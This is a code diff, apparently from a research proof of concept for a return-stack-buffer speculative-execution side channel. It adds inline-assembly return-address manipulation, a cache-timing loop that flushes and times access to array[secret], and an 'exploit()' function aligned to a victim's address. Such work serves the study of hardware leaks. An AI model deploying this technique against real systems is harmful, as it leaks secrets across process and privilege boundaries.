@@ -8,22 +8,49 @@ using namespace std;
 
 char array[256*256];
 
-volatile void spacer() {
-	asm(
-		// ".rept 2235;"
-		".rept 2215;"
-		// ".rept 2062;"
-		"nop;"
-		".endr;"
-	);
+#define retAsm(i) "call get_rip" #i ";"  "get_rip" #i ":"  "pop %0;" "add $7,%0;" "push %0;" "ret;"
+
+char array[256*256];
+int total = 0;
+
+inline void timeAndFlush(ADDR_PTR addr) {
+	printAccessTime(addr);
+	clflush((void *)addr);
 }
 
-void gadget() {
-	asm(
-		"lbl:"
-		"pop %rax;"
-		"call lbl;"
-	);
+void checkForMisspeculation() {
+	ADDR_PTR address, tmp;
+
+	for (int i = 0; i < 10000; i++) {
+		sched_yield();
+		asm(
+			retAsm(1)
+			retAsm(2)
+			retAsm(3)
+			retAsm(4)
+			retAsm(5)
+			retAsm(6)
+			retAsm(7)
+			retAsm(8)
+			retAsm(9)
+			retAsm(10)
+			retAsm(11)
+			retAsm(12)
+			retAsm(13)
+			retAsm(14)
+			retAsm(15)
+			retAsm(16)
+			: "=r" (tmp)
+			: "r" (address)
+		);
+	
+		total += measure_one_block_access_time((ADDR_PTR)&array[secret]);
+		clflush((void *)&array[secret]);
+	}
+}
+
+void exploit() { // this should be at the same VA as victim's callLoop()
+	volatile int temp = array[secret];
 }
 
 int main(int argc, char *argv[]){
@@ -31,8 +58,6 @@ int main(int argc, char *argv[]){
 		printf("doing nothing\n");
 		while(1) {}
 	}
-	// printf("polluting rsb\n");
-	// gadget();
 
 	ADDR_PTR start = 0x0000555555556000;
 
